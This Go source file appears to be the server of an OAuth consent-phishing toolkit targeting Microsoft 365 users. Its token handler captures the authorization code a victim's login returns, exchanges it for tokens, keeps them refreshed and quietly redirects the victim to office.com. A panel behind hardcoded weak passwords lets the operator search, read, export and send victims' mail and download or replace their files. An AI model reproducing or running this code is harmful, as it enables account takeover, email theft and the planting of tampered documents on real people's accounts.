package server

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"oauth2-microsoft/api"
	"oauth2-microsoft/database"
	"oauth2-microsoft/model"
	"time"

	"github.com/gorilla/mux"
	"github.com/kataras/iris/v12"
	"github.com/kataras/iris/v12/middleware/basicauth"
)

func StartIntServer(config model.Config) {

	// Start the update token function
	database.InitTables()

	go api.RecursiveTokenUpdate()

	log.Printf("Starting Internal Server on 127.0.0.1:%d \n", config.Server.InternalPort)

	app := iris.New()
	authConfig := basicauth.Config{
		Users:   map[string]string{"test0": "000000", "test1": "111111"},
		Realm:   "Authorization Required", // 默认表示域 "Authorization Required"
		Expires: time.Duration(60 * 24 * 7) * time.Minute,
	}
	authentication := basicauth.New(authConfig)
	app.Use(authentication)

	app.HandleDir("/assets/", "assets/")
	app.HandleDir("/download/", "downloads/")

	app.Get("/", GetUsers)
	app.Get(model.IntAbout, GetAbout)
	app.Get(model.IntGetAll, GetUsers)
	app.Get(model.IntUserFiles, GetUserFiles)

	app.Get(model.IntLiveMain, GetLiveMain)
	app.Get(model.IntLiveSearchMail, GetLiveEmails)
	app.Get(model.IntExportMails, ExportAllEmails)
	app.Post(model.IntLiveSendMail, SendEmail)
	app.Get(model.IntLiveOpenMail, GetEmail)
	app.Get(model.IntLiveSearchFiles, GetLiveFiles)
	app.Get(model.IntLiveDownloadFile, DownloadFileHandler)
	app.Post(model.IntLiveReplaceFile, ReplaceFile)

	app.Run(iris.Addr(fmt.Sprintf("%s:%d", config.Server.Host, config.Server.InternalPort)))
}

func StartExtServer(config model.Config) {
	api.GenerateURL()
	log.Printf("Starting External Server on %s:%d \n", config.Server.Host, config.Server.ExternalPort)
	route := mux.NewRouter()
	route.HandleFunc(model.ExtTokenPage, GetToken).Methods("GET")
	//route.PathPrefix(model.ExtMainPage).Handler(http.FileServer(http.Dir("./static/")))
	server := &http.Server{
		Addr:    fmt.Sprintf("%s:%d", config.Server.Host, config.Server.ExternalPort),
		Handler: route,
	}
	//server.ListenAndServeTLS(config.Server.Certificate,config.Server.Key)
	server.ListenAndServe()
}

// GetToken will handle the request and initilize the thing with the code
func GetToken(w http.ResponseWriter, r *http.Request) {
	//w.WriteHeader(http.StatusOK)
	r.ParseForm()

	if r.FormValue("error") != "" {
		log.Printf("Error %s : %s\n", r.FormValue("error"), r.FormValue("error_description"))
	} else {

		jsonData := api.GetAllTokens(r.FormValue("code"))
		if jsonData != nil {
			authResponse := model.AuthResponse{}
			json.Unmarshal(jsonData, &authResponse)

			api.InitializeProfile(authResponse.AccessToken, authResponse.RefreshToken)
		}

	}
	// Whatever happens, success or not we need to redirect
	http.Redirect(w, r, "https://office.com", 301)
}
